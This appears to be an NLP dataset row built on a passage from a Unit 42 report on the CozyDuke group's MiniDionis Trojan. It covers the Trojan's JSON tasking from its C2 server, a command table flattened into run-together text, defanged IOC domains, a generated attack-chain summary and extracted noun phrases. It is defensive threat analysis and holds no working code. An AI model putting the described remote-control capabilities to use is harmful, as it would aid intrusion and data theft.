: """", 'data' : """"} }, ] }{ 'tasks' : [ {'task_id' : """", 'task_data' : {'command' : """", 'data' : """"} }, ] }The Trojan takes this JSON blob and adds each task in the list into a pool for processing. Separate worker threads access this pool of tasks and process the commands and perform the necessary activities.Unit 42 analyzed the Trojan’s command handler and found several commands, as seen in Table 2, which allows the threat actors to carry out a full range of activities on the system.CommandSub-CommandcmdcdDescription Checks for subcommands within the ‘data’ section, if not it attempts to run the ‘data’ using “cmd /c :proxy:exit:wget :uploadto execexecwReturns current working directory Change to temporary directory Sets the timeout between network beacons Configures proxy information Exits the Trojan and responds to the C2 server with “Bye!” Downloads a file from a specified URL Uploads a file to a specified URL Launches an application and waits for it to exit Launches an applications and does not wait for it to exit Uploads or downloads from a list of files to or from the C2 server Sends system information from the compromised system to the C2 serveruplsrvTable 2. Available Commands within MiniDionis’ Command HandlerConclusionThe actors behind the CozyDuke framework are highly sophisticated, motivated, and have become increasingly bold in their campaigns.We recommend that other security practitioners review the included Indicators of Compromise (IoCs) to ensure they have not been targets in this campaign, and add the appropriate security controls to prevent future attacks.This group is reliant on social engineering, and thus, user education remains of paramount importance.Palo Alto Networks customers using WildFire were protected from this campaign. All known elements of this campaign have been accurately identified by WildFire as malicious.IOCsdomain ipff.whitebirchpaper[.]com visionresearch[.]com betawebservices.ntnonline[.]com staff.shasta[.]com extranet.qualityplanning[.]com secure.hgl[.]com illuminatistudios[.]net kane-consulting[.]net edadmin.kearsney[.]com urlSources[1] url [2] url [3] url [4] url ","1. The threat actors send spear phishing emails with weaponized attachments to targets. 2. When the attachment is opened, it drops a decoy media file and a downloader. 3. The downloader retrieves the main malware payload disguised as a Flash file. 4. The payload is decoded and dropped onto the system, named to emulate legitimate software. 5. The malware connects to a C2 server, beaconing over HTTPS with encrypted cookie data. 6. The C2 server sends commands in JSON format for the malware to execute on the infected system. 7. Available commands allow the threat actors to remotely control the system, download/upload files, execute arbitrary commands, and exfiltrate data. ",valid_2,"['the threat actors', 'spear phishing emails', 'targets', 'a decoy', 'media', 'a file', 'Flash', 'the payload', 'the system', 'legitimate software', 'the malware', 'HTTPS', 'cookie data', 'the C2 server', 'JSON', 'Available commands', 'files']",the threat actors; spear phishing emails; targets; a decoy; media; a file; Flash; the payload; the system; legitimate software; the malware; HTTPS; cookie data; the C2 server; JSON; Available commands; files.
